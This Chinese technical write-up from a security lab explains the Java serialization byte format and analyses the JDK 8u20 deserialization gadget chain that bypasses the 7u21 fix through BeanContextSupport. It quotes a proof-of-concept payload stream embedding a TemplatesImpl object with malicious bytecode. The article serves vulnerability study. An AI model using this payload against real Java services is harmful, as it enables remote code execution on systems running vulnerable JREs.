**作者：天融信阿尔法实验室**  
**原文链接：<https://mp.weixin.qq.com/s/TAjfHEJCvP-1yK2hUZlrbQ>**

## 一、前言

在`JDK7u21`中反序列化漏洞修补方式是在`AnnotationInvocationHandler`类对type属性做了校验,原来的payload就会执行失败,在8u20中使用`BeanContextSupport`类对这个修补方式进行了绕过。

## 二、Java序列化过程及数据分析

在8u20的POC中需要直接操作序列化文件结构,需要对Java序列化数据写入过程、数据结构和数据格式有所了解。

先看一段代码

    
    
    import java.io.Serializable;
    
    public class B implements Serializable {
        public String name = "jack";
        public int age = 100;
    
        public B() {
        }
    }
    
    
    import java.io.*;
    
    public class A extends B implements Serializable {
        private static final long serialVersionUID = 1L;
        public String name = "tom";
        public int age = 50;
    
        public A() {
        }
    
        public static void main(String[] args) throws IOException {
            A a = new A();
            serialize(a, "./a.ser");
        }
    
        public static void serialize(Object object, String file) throws IOException {
            File f = new File(file);
            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
            out.writeObject(object);
            out.flush();
            out.close();
        }
    }

运行A类main方法会生成a.ser文件,以16进制的方式打开看下a.ser文件内容

    
    
    0000000 ac ed 00 05 73 72 00 01 41 00 00 00 00 00 00 00
    0000010 01 02 00 02 49 00 03 61 67 65 4c 00 04 6e 61 6d
    0000020 65 74 00 12 4c 6a 61 76 61 2f 6c 61 6e 67 2f 53
    0000030 74 72 69 6e 67 3b 78 72 00 01 42 bf 30 15 78 75
    0000040 7d f1 2f 02 00 02 49 00 03 61 67 65 4c 00 04 6e
    0000050 61 6d 65 71 00 7e 00 01 78 70 00 00 00 64 74 00
    0000060 04 6a 61 63 6b 00 00 00 32 74 00 03 74 6f 6d   
    000006f

跟下ObjectOutputStream类,来一步步分析下这些代码的含义

java.io.ObjectOutputStream#writeStreamHeader 写入头信息

![](https://images.seebug.org/content/images/2020/06/abf685f3-10b2-48a9-9722-13a6ff390da9.png-w331s)

java.io.ObjectStreamConstants 看下具体值

![](https://images.seebug.org/content/images/2020/06/11723f61-4a7f-4b2f-af73-47c9a0208c23.png-w331s)

`STREAM_MAGIC`
16进制的aced固定值,是这个流的魔数写入在文件的开始位置,可以理解成标识符,程序根据这几个字节的内容就可以确定该文件的类型。

`STREAM_VERSION` 这个是流的版本号,当前版本号是5。

在看下`out.writeObject(object)`是怎么写入数据的,会先解析class结构,然后判断是否实现了Serializable接口,然后执行`java.io.ObjectOutputStream#writeOrdinaryObject`方法

![](https://images.seebug.org/content/images/2020/06/746c0a19-5bf5-4f9d-b23a-075ee590fd79.png-w331s)

1426行写入`TC_OBJECT,`常量`TC_OBJECT`的值是`(byte)0x73`,1427行调用`writeClassDesc`方法,然后会调用到`java.io.ObjectOutputStream#writeNonProxyDesc`方法

![](https://images.seebug.org/content/images/2020/06/167a049d-b55a-4c84-85db-3527bbe0e1ad.png-w331s)

`TC_CLASSDESC`的值是(byte)0x72,在调用`java.io.ObjectStreamClass#writeNonProxy`方法。

![](https://images.seebug.org/content/images/2020/06/48076bb0-23dd-4e6d-bb8e-32f5f79f8ae4.png-w331s)

721行先写入对象的类名,然后写入`serialVersionUID`的值,看下`java.io.ObjectStreamClass#getSerialVersionUID`方法

![](https://images.seebug.org/content/images/2020/06/aa2b6a40-bb82-4979-8778-38052f4f2da6.png-w331s)

默认使用对象的`serialVersionUID`值,如果对象`serialVersionUID`的值为空则会计算出一个`serialVersionUID`的值。

接着调用`out.writeByte(flags)`写入`classDescFlags`,可以看见上面判断了如果是实现了`serializable`则取常量`SC_SERIALIZABLE`
的0x02值。然后调用`out.writeShort(fields.length)`写入成员的长度。在调用`out.writeByte`和`out.writeUTF`方法写入属性的类型和名称。

然后调用`bout.writeByte(TC_ENDBLOCKDATA)`方法表示一个Java对象的描述结束。`TC_ENDBLOCKDATA`常量的值是(byte)0x78。在调用`writeClassDesc(desc.getSuperDesc(),
false)`写入父类的结构信息。

接着调用`writeSerialData(obj,
desc)`写入对象属性的值,调用`java.io.ObjectOutputStream#writeSerialData`

![](https://images.seebug.org/content/images/2020/06/8ded558d-5443-4fc8-bd44-5b6cc1acef40.png-w331s)

可以看见`slots`变量的值是父类在前面,这里会先写入的是父类的值。

`java.io.ObjectOutputStream#defaultWriteFields`

![](https://images.seebug.org/content/images/2020/06/be27796a-7845-43a7-8f95-e75d3e752283.png-w331s)

这里可以总结下,在序列化对象时,先序列化该对象类的信息和该类的成员属性,再序列化父类的类信息和成员属性,然后序列化对象数据信息时,先序列化父类的数据信息,再序列化子类的数据信息,两部分数据生成的顺序刚好相反。

分析Java序列化文件,使用`SerializationDumper`工具可以帮助我们理解,这里使用`SerializationDumper`查看这个序列化文件看下

    
    
    STREAM_MAGIC - 0xac ed
    STREAM_VERSION - 0x00 05
    Contents
      TC_OBJECT - 0x73
        TC_CLASSDESC - 0x72
          className
            Length - 1 - 0x00 01
            Value - A - 0x41
          serialVersionUID - 0x00 00 00 00 00 00 00 01
          newHandle 0x00 7e 00 00
          classDescFlags - 0x02 - SC_SERIALIZABLE
          fieldCount - 2 - 0x00 02
          Fields
            0:
              Int - I - 0x49
              fieldName
                Length - 3 - 0x00 03
                Value - age - 0x616765
            1:
              Object - L - 0x4c
              fieldName
                Length - 4 - 0x00 04
                Value - name - 0x6e616d65
              className1
                TC_STRING - 0x74
                  newHandle 0x00 7e 00 01
                  Length - 18 - 0x00 12
                  Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
          classAnnotations
            TC_ENDBLOCKDATA - 0x78
          superClassDesc
            TC_CLASSDESC - 0x72
              className
                Length - 1 - 0x00 01
                Value - B - 0x42
              serialVersionUID - 0xbf 30 15 78 75 7d f1 2f
              newHandle 0x00 7e 00 02
              classDescFlags - 0x02 - SC_SERIALIZABLE
              fieldCount - 2 - 0x00 02
              Fields
                0:
                  Int - I - 0x49
                  fieldName
                    Length - 3 - 0x00 03
                    Value - age - 0x616765
                1:
                  Object - L - 0x4c
                  fieldName
                    Length - 4 - 0x00 04
                    Value - name - 0x6e616d65
                  className1
                    TC_REFERENCE - 0x71
                      Handle - 8257537 - 0x00 7e 00 01
              classAnnotations
                TC_ENDBLOCKDATA - 0x78
              superClassDesc
                TC_NULL - 0x70
        newHandle 0x00 7e 00 03
        classdata
          B
            values
              age
                (int)100 - 0x00 00 00 64
              name
                (object)
                  TC_STRING - 0x74
                    newHandle 0x00 7e 00 04
                    Length - 4 - 0x00 04
                    Value - jack - 0x6a61636b
          A
            values
              age
                (int)50 - 0x00 00 00 32
              name
                (object)
                  TC_STRING - 0x74
                    newHandle 0x00 7e 00 05
                    Length - 3 - 0x00 03
                    Value - tom - 0x746f6d

## 三、漏洞分析及POC解读

8u20是基于7u21的绕过,不熟悉7u21的可以先看[这篇](https://mp.weixin.qq.com/s/qlg3IzyIc79GABSSUyt-OQ)文章了解下,看下7u21漏洞的修补方式。

`sun.reflect.annotation.AnnotationInvocationHandler#readObject`

    
    
        private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
            var1.defaultReadObject();
            AnnotationType var2 = null;
    
            try {
                var2 = AnnotationType.getInstance(this.type);
            } catch (IllegalArgumentException var9) {
                throw new InvalidObjectException("Non-annotation type in annotation serial stream");
            }
            ...

在`AnnotationType.getInstance`方法里对this.type类型有判断,需要是annotation类型,原payload里面是`Templates`类型,所以这里会抛出错误。可以看到在readObject方法里面,是先执行`var1.defaultReadObject()`还原了对象,然后在进行验证,不符合类型则抛出异常。漏洞作者找到`java.beans.beancontext.BeanContextSupport`类对这里进行了绕过。

看下BeanContextSupport类

    
    
        private synchronized void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    
            synchronized(BeanContext.globalHierarchyLock) {
                ois.defaultReadObject();
    
                initialize();
    
                bcsPreDeserializationHook(ois);
    
                if (serializable > 0 && this.equals(getBeanContextPeer()))
                    readChildren(ois);
    
                deserialize(ois, bcmListeners = new ArrayList(1));
            }
        }
    
    
        public final void readChildren(ObjectInputStream ois) throws IOException, ClassNotFoundException {
            int count = serializable;
    
            while (count-- > 0) {
                Object                      child = null;
                BeanContextSupport.BCSChild bscc  = null;
    
                try {
                    child = ois.readObject();
                    bscc  = (BeanContextSupport.BCSChild)ois.readObject();
                } catch (IOException ioe) {
                    continue;
                } catch (ClassNotFoundException cnfe) {
                    continue;
                }
                ...

可以看到在`readChildren`方法中,在执行`ois.readObject()`时,这里try
catch了,但是没有把异常抛出来,程序会接着执行。如果这里可以把`AnnotationInvocationHandler`对象在`BeanContextSupport`类第二次writeObject的时候写入`AnnotationInvocationHandler`对象,这样反序列化时,即使`AnnotationInvocationHandler`对象
this.type的值为`Templates`类型也不会报错。

反序列化还有两点就是:

  1. 反序列化时类中没有这个成员,依然会对这个成员进行反序列化操作,但是会抛弃掉这个成员。

  2. 每一个新的对象都会分配一个newHandle的值,newHandle生成规则是从0x7e0000开始递增,如果后面出现相同的类型则会使用`TC_REFERENCE`结构,引用前面handle的值。

下面直接来看pwntester师傅提供的poc吧

    
    
    ...
    new Object[]{
                    STREAM_MAGIC, STREAM_VERSION, // stream headers
    
                    // (1) LinkedHashSet
                    TC_OBJECT,
                    TC_CLASSDESC,
                    LinkedHashSet.class.getName(),
                    -2851667679971038690L,
                    (byte) 2,              // flags
                    (short) 0,             // field count
                    TC_ENDBLOCKDATA,
                    TC_CLASSDESC,          // super class
                    HashSet.class.getName(),
                    -5024744406713321676L,
                    (byte) 3,              // flags
                    (short) 0,             // field count
                    TC_ENDBLOCKDATA,
                    TC_NULL,               // no superclass
    
                    // Block data that will be read by HashSet.readObject()
                    // Used to configure the HashSet (capacity, loadFactor, size and items)
                    TC_BLOCKDATA,
                    (byte) 12,
                    (short) 0,
                    (short) 16,            // capacity
                    (short) 16192, (short) 0, (short) 0, // loadFactor
                    (short) 2,             // size
    
                    // (2) First item in LinkedHashSet
                    templates, // TemplatesImpl instance with malicious bytecode
    
                    // (3) Second item in LinkedHashSet
                    // Templates Proxy with AIH handler
                    TC_OBJECT,
                    TC_PROXYCLASSDESC,          // proxy declaration
                    1,                          // one interface
                    Templates.class.getName(),  // the interface implemented by the proxy
                    TC_ENDBLOCKDATA,
                    TC_CLASSDESC,
                    Proxy.class.getName(),      // java.lang.Proxy class desc
                    -2222568056686623797L,      // serialVersionUID
                    SC_SERIALIZABLE,            // flags
                    (short) 2,                  // field count
                    (byte) 'L', "dummy", TC_STRING, "Ljava/lang/Object;", // dummy non-existent field
                    (byte) 'L', "h", TC_STRING, "Ljava/lang/reflect/InvocationHandler;", // h field
                    TC_ENDBLOCKDATA,
                    TC_NULL,                    // no superclass
    
                    // (3) Field values
                    // value for the dummy field <--- BeanContextSupport.
                    // this field does not actually exist in the Proxy class, so after deserialization this object is ignored.
                    // (4) BeanContextSupport
                    TC_OBJECT,
                    TC_CLASSDESC,
                    BeanContextSupport.class.getName(),
                    -4879613978649577204L,      // serialVersionUID
                    (byte) (SC_SERIALIZABLE | SC_WRITE_METHOD),
                    (short) 1,                  // field count
                    (byte) 'I', "serializable", // serializable field, number of serializable children
                    TC_ENDBLOCKDATA,
                    TC_CLASSDESC,               // super class
                    BeanContextChildSupport.class.getName(),
                    6328947014421475877L,
                    SC_SERIALIZABLE,
                    (short) 1,                  // field count
                    (byte) 'L', "beanContextChildPeer", TC_STRING, "Ljava/beans/beancontext/BeanContextChild;",
                    TC_ENDBLOCKDATA,
                    TC_NULL,                    // no superclass
    
                    // (4) Field values
                    // beanContextChildPeer must point back to this BeanContextSupport for BeanContextSupport.readObject to go into BeanContextSupport.readChildren()
                    TC_REFERENCE, baseWireHandle + 12,
                    // serializable: one serializable child
                    1,
    
                    // now we add an extra object that is not declared, but that will be read/consumed by readObject
                    // BeanContextSupport.readObject calls readChildren because we said we had one serializable child but it is not in the byte array
                    // so the call to child = ois.readObject() will deserialize next object in the stream: the AnnotationInvocationHandler
                    // At this point we enter the readObject of the aih that will throw an exception after deserializing its default objects
    
                    // (5) AIH that will be deserialized as part of the BeanContextSupport
                    TC_OBJECT,
                    TC_CLASSDESC,
                    "sun.reflect.annotation.AnnotationInvocationHandler",
                    6182022883658399397L,       // serialVersionUID
                    (byte) (SC_SERIALIZABLE | SC_WRITE_METHOD),
                    (short) 2,                  // field count
                    (byte) 'L', "type", TC_STRING, "Ljava/lang/Class;",         // type field
                    (byte) 'L', "memberValues", TC_STRING, "Ljava/util/Map;",   // memberValues field
                    TC_ENDBLOCKDATA,
                    TC_NULL,                    // no superclass
    
                    // (5) Field Values
                    Templates.class,            // type field value
                    map,                        // memberValues field value
    
                    // note: at this point normally the BeanContextSupport.readChildren would try to read the
                    // BCSChild; but because the deserialization of the AnnotationInvocationHandler above throws,
                    // we skip past that one into the catch block, and continue out of readChildren
    
                    // the exception takes us out of readChildren and into BeanContextSupport.readObject
                    // where there is a call to deserialize(ois, bcmListeners = new ArrayList(1));
                    // Within deserialize() there is an int read (0) and then it will read as many obejcts (0)
    
                    TC_BLOCKDATA,
                    (byte) 4,                   // block length
                    0,                          // no BeanContextSupport.bcmListenes
                    TC_ENDBLOCKDATA,
    
                    // (6) value for the Proxy.h field
                    TC_REFERENCE, baseWireHandle + offset + 16, // refer back to the AnnotationInvocationHandler
    
                    TC_ENDBLOCKDATA,
            };
    ...

这里直接构造序列化的文件结构和数据,可以看到注释分为6个步骤:

  1. 构造LinkedHashSet的结构信息

  2. 写入payload中TemplatesImpl对象

  3. 构造Templates Proxy的结构,这里定义了一个虚假的`dummy`成员,虚假成员也会进行反序列化操作,虽然会抛弃掉这个成员,但是也会生成一个newHandle的值。

  4. 这里为了`BeanContextSupport`对象反序列化时能走到`readChildren`方法那,需要设置serializable要>0并且父类 `beanContextChildPeer`成员的值为当前对象。`BeanContextChildSupport`对象已经出现过了,这里直接进行`TC_REFERENCE`引用对应的`Handle`。

  5. 前面分析过在`readChildren`方法中会再次进行`ois.readObject()`,这里把payload里面的`AnnotationInvocationHandler`对象写入即可。这里try catch住了,并没有抛出异常,虽然`dummy`是假属性依然会进行反序列化操作,目的就是完成反序列化操作生成newHandle值,用于后面直接进行引用。

  6. 这里就是原`JDK7u21`里面的payload,把`AnnotationInvocationHandler`对象引用至前面的handle地址即可。

## 四、总结

JDK7u21和8u20这两个payload不依赖第三方的jar,只需要满足版本的JRE即可进行攻击,整条链也十分巧妙,在8u20中的几个trick也让我对Java序列化机制有了进一步的认识。

## 五、参考链接

  1. <https://github.com/pwntester/JRE8u20_RCE_Gadget>

  2. <https://www.anquanke.com/post/id/87270>

  3. <https://www.freebuf.com/vuls/176672.html>

  4. <https://xz.aliyun.com/t/7240#toc-3>

  5. <https://blog.csdn.net/silentbalanceyh/article/details/8183849>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1232/>

